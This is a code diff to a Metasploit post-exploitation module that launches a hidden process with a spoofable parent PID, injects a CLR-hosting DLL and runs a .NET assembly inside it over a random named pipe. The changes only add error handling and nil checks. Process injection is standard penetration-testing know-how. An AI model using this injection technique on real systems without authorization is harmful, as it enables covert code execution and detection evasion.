@@ -149,9 +149,14 @@ class MetasploitModule < Msf::Post
   end
 
   def cleanup
-    if terminate_process
+    if terminate_process && !hprocess.nil? && !hprocess.pid.nil?
       print_good("Killing process #{hprocess.pid}")
-      client.sys.process.kill(hprocess.pid)
+      begin
+        client.sys.process.kill(hprocess.pid)
+      rescue Rex::Post::Meterpreter::RequestError => e
+        print_warning("Error while terminating process: #{e}")
+        print_warning('Process may already have terminated')
+      end
     end
 
     handles_to_close.each(&:close)
@@ -193,13 +198,18 @@ class MetasploitModule < Msf::Post
     process_name = sanitize_process_name(datastore['PROCESS'])
     print_status("Launching #{process_name} to host CLR...")
 
-    process = client.sys.process.execute(process_name, nil, {
-      'Channelized' => false,
-      'Hidden' => true,
-      'UseThreadToken' => !(!datastore['USETHREADTOKEN']),
-      'ParentPid' => datastore['PPID']
-    })
-    hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
+    begin
+      process = client.sys.process.execute(process_name, nil, {
+        'Channelized' => false,
+        'Hidden' => true,
+        'UseThreadToken' => !(!datastore['USETHREADTOKEN']),
+        'ParentPid' => datastore['PPID']
+      })
+      hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      fail_with(Failure::BadConfig, "Unable to launch process: #{e}")
+    end
+
     print_good("Process #{hprocess.pid} launched.")
     hprocess
   end
@@ -223,11 +233,15 @@ class MetasploitModule < Msf::Post
 
     if pid_exists(pid)
       print_status("Opening handle to process #{pid}...")
-      hprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+      begin
+        hprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+      rescue Rex::Post::Meterpreter::RequestError => e
+        fail_with(Failure::BadConfig, "Unable to access process #{pid}: #{e}")
+      end
       print_good('Handle opened')
       hprocess
     else
-      fail_with(Failure::BadConfig, 'Pid not found')
+      fail_with(Failure::BadConfig, 'PID not found')
     end
   end
 
@@ -262,14 +276,18 @@ class MetasploitModule < Msf::Post
 
     handles_to_close.append(hprocess)
 
-    exploit_mem, offset = inject_hostclr_dll(hprocess)
+    begin
+      exploit_mem, offset = inject_hostclr_dll(hprocess)
 
-    pipe_suffix = Rex::Text.rand_text_alphanumeric(8)
-    pipe_name = "\\\\.\\pipe\\#{pipe_suffix}"
-    appdomain_name = Rex::Text.rand_text_alpha(9)
-    vprint_status("Connecting with CLR via #{pipe_name}")
-    vprint_status("Running in new AppDomain: #{appdomain_name}")
-    assembly_mem = copy_assembly(pipe_name, appdomain_name, clr_version, exe_path, hprocess)
+      pipe_suffix = Rex::Text.rand_text_alphanumeric(8)
+      pipe_name = "\\\\.\\pipe\\#{pipe_suffix}"
+      appdomain_name = Rex::Text.rand_text_alpha(9)
+      vprint_status("Connecting with CLR via #{pipe_name}")
+      vprint_status("Running in new AppDomain: #{appdomain_name}")
+      assembly_mem = copy_assembly(pipe_name, appdomain_name, clr_version, exe_path, hprocess)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      fail_with(Failure::PayloadFailed, "Error while allocating memory: #{e}")
+    end
 
     print_status('Executing...')
     begin
